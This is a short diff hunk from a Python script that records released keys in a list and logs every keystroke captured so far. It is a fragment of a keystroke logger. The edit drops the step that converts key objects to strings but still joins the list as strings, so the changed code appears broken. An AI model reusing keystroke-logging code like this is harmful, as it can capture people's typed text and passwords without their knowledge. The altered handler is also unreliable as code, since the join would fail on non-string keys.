@@ -14,13 +14,7 @@ logging.basicConfig(
 keystrokes = []
 
 def on_release(key):
-    # Record the key in the list
-    if hasattr(key, 'char') and key.char:
-        keystrokes.append(key.char)
-    else:
-        keystrokes.append(str(key))
-
-    # Log all keys recorded so far
+    keystrokes.append(key)
     logging.info(f'Keys recorded: {", ".join(keystrokes)}')
 
 def main():
